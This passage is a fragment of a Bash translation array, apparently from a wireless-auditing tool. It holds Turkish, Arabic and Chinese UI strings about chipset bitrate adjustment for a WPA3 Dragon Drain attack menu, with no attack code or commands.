	arr["TURKISH","wpa3_dragon_drain_attack_17"]="\${pending_of_translation} Yonga setiniz tarafından desteklenen bitrate ayarı. Güvenilirliği artırmak için ayarlamak..."
	arr["ARABIC","wpa3_dragon_drain_attack_17"]="\${pending_of_translation} ...تعديل bitrate المدعوم من مجموعة الشرائح الخاصة بك. ضبطه لتحسين الموثوقية"
	arr["CHINESE","wpa3_dragon_drain_attack_17"]="芯片组支持 bitrate 调整。调整它以提高可靠性..."
}
